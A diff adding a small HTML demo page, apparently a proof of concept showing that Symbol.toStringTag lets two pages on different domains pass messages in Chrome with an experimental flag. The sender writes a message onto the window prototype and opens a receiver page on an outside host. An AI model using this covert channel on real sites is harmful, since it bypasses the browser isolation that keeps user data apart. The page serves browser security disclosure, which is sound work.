@@ -1,0 +1,19 @@
+<h1>cross-domain communication using <code>Symbol.toStringTag</code></h1>
+<h3>only Chrome with <code>--enable-javascript-harmony</code></h3>
+<input id="msg"><button onclick="foo()">Send</button>
+<input checked type="radio" name="opt" value="iframe">Iframe
+<input type="radio" name="opt" value="opener">Open tab<br>
+<br><br>
+<iframe style="width:60%;height:200px" src="" id="recv"></iframe>
+<script>
+    function foo() {
+        var msg = document.getElementById('msg').value, opt = document.getElementsByName('opt')[0];
+        var url = 'http://demo.vwzq.net/covert/symbol_r.html';
+        window.__proto__[Symbol.toStringTag] = msg;
+        if (opt.checked) {
+            window.frames[0].location = url;
+        } else {
+            window.open(url, '_msg');
+        }
+    }
+</script>
